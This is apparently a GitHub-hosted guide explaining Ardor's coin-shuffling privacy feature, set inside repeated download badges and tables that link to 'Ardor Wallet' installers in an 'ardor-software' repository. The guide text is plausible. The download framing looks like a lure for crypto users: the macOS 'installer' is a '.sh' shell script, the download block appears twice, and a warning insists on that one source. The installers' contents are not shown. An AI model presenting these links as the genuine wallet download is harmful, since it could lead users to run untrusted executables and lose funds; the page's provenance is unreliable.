![Ardor Wallet guide](assets/banner-article.png)

# Shuffle coins for privacy in Ardor

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Coin shuffling lets a group of accounts exchange amounts among themselves so that the chain records transfers without an obvious link between sender and recipient. It is a protocol feature, not a mixer service: participants are other accounts on the same chain, and the shuffle runs according to rules the chain enforces.

## What a shuffle does

Several accounts join a shuffle with an amount each. When the shuffle executes, the participants receive amounts that came from the group rather than from a specific sender, so an observer cannot straightforwardly match a payment to its origin by reading the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md).

The result is not untraceable money. It is a break in the direct link, which raises the cost of following funds and matters most when the amount and the timing would otherwise identify a payment to anyone watching the chain.

## Who takes part

The participants are other accounts using the same chain, and a shuffle needs a minimum number of them before it can run. That is why a shuffle can sit waiting: it is not a service you call, it is a group you join.

For a chain with low activity, that wait can be long. Planning a shuffle for an urgent payment is a mistake; the mechanism is better suited to a transfer that can happen when enough participants are available, which is a scheduling question rather than a technical one.

## Creating or joining a shuffle

1. Unlock the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and choose the chain you will shuffle on.
2. Open the shuffling control and choose to create or join.
3. Set the amount and the number of participants the shuffle requires.
4. Confirm the transaction and pay the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md).
5. Wait for the shuffle to fill and execute.
6. Check the resulting transaction in your history.

Step five is the part that needs patience. A shuffle that never reaches its participant count does not execute, and the amount stays where it is until it does or until you give up on it.

## What it costs

A shuffle is a transaction with a fee, and the fee is paid when you commit whether or not the shuffle completes. That is worth weighing against the amount being shuffled: on a small amount, the fee can be a meaningful fraction of the privacy purchased.

If the amount is large and the timing is flexible, the cost is easy to justify against what the payment would otherwise reveal. If the amount is small, the fee may be the more visible number, and the honest answer is that the privacy is not worth the fee at that size. Shuffling is a tool for transfers where the link is the thing being hidden.

## What it does not hide

The chain still records that your [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) participated, the amount, and the time. Shuffling breaks the direct link between two accounts; it does not make a transaction invisible, and it does not hide the fact that you moved funds.

Addresses also reuse: an account that keeps shuffling and then consolidating reveals patterns in its own behaviour. Privacy here is a property of how you use the chain over time, not of a single action, and a shuffle followed by an obvious consolidation undoes most of what the shuffle achieved.

## Choosing when to shuffle

The best moment is before the payment is needed, not after. A shuffle that has to complete by a deadline turns into a wait you cannot control, and the participants are other people with their own timing.

Amount matters too. Shuffling an amount that is unusual for your account stands out however well the link is broken, because the size itself identifies the transfer. A common amount and a flexible window produce a better result than a precise figure at a fixed time.

## What privacy this actually buys

It buys the removal of a direct link, which is meaningful against an observer who is following a single payment. It does not buy anonymity against somebody who can see your whole history and reason about timing, amounts and consolidation over a period of months.

That distinction is worth holding onto. Most real privacy comes from how an account behaves over months rather than from one mechanism, and a shuffle is one tool in that behaviour, not a switch that turns the account private.

## Voting and privacy on the platform

It is worth knowing that other platform features have their own visibility. Votes are public, marketplace listings are public, and aliases are public by design. Shuffling addresses one specific problem, and it does not change the rest.

Anyone planning to use the platform privately should look at each feature's defaults rather than assuming a single privacy control covers everything. The chain is transparent unless a mechanism specifically says otherwise.

## FAQ

### Is shuffling the same as a mixer service?

No. It is a protocol feature that groups participants on the same chain. There is no operator holding your funds.

### How long does a shuffle take?

Until enough participants join. On a quiet chain that can take a while, which is why it suits transfers that are not urgent.

### Can a shuffle be traced?

It breaks the direct link between sender and recipient, which raises the cost of tracing but does not make the funds untraceable.

### Does the fee get refunded if the shuffle does not complete?

No. The transaction fee is paid when you join or create the shuffle, regardless of whether it executes.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
